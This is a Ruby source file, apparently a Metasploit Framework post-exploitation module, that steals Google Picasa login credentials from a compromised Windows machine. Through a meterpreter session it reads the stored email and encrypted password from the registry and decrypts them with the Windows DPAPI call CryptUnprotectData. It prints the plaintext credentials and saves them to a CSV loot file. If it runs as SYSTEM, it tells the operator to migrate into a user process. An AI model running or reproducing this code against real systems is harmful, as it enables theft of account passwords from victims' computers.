##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/priv'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Google Picasa Password Extractor',
        'Description'   => %q{
          This module extracts and decrypts the login passwords
          stored by Google Picasa.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
        [
          'SecurityXploded Team',  #www.SecurityXploded.com
          'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
        ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end


  def prepare_railgun
    rg = session.railgun
    if (!rg.get_dll('crypt32'))
      rg.add_dll('crypt32')
    end
  end


  def decrypt_password(data)
    rg = session.railgun
    pid = client.sys.process.getpid
    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(512)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
      addr = [mem].pack("V")
      len = [data.length].pack("V")
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret["pDataOut"].unpack("V2")
    else
      addr = [mem].pack("Q")
      len = [data.length].pack("Q")
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      len, addr = ret["pDataOut"].unpack("Q2")
    end

    return "" if len == 0
    decrypted_pw = process.memory.read(addr, len)
    return decrypted_pw
  end

  def get_registry

    begin
      print_status("Looking in registry for stored login passwords by Picasa ...")

      username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaEmail') || ''
      password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaPass')  || ''

      credentials = Rex::Ui::Text::Table.new(
          'Header'    => "Picasa Credentials",
          'Indent'    => 1,
          'Columns'   =>
          [
            "User",
            "Password"
          ])

      foundcreds = 0
      if !username.empty? and !password.empty?
        passbin = [password].pack("H*")
        pass = decrypt_password(passbin)

        if pass and !pass.empty?
          print_status("Found Picasa 2 credentials.")
          print_good("Username: #{username}\t Password: #{pass}")

          foundcreds = 1
          credentials << [username,pass]
        end
      end

      #For early versions of Picasa3
      username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\", 'GaiaEmail') || ''
      password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\", 'GaiaPass')  || ''


      if !username.empty? and !password.empty?
        passbin = [password].pack("H*")
        pass = decrypt_password(passbin)

        if pass and !pass.empty?
          print_status("Found Picasa 3 credentials.")
          print_good("Username: #{username}\t Password: #{pass}")

          foundcreds = 1
          credentials << [username,pass]
        end
      end

    if foundcreds == 1
      path = store_loot(
        "picasa.creds",
        "text/csv",
        session,
        credentials.to_csv,
        "decrypted_picasa_data.csv",
        "Decrypted Picasa Passwords"
      )

      print_status("Decrypted passwords saved in: #{path}")
    else
      print_status("No Picasa credentials found.")
    end

    rescue ::Exception => e
      print_error("An error has occurred: #{e.to_s}")
    end
  end

  def run
    uid = session.sys.config.getuid  #Decryption only works in context of user's account.

    if is_system?
      print_error("This module is running under #{uid}.")
      print_error("Automatic decryption will not be possible.")
      print_error("Migrate to a user process to achieve successful decryption (e.g. explorer.exe).")
    else
      prepare_railgun
      get_registry()
    end

    print_status("Done")
  end
end
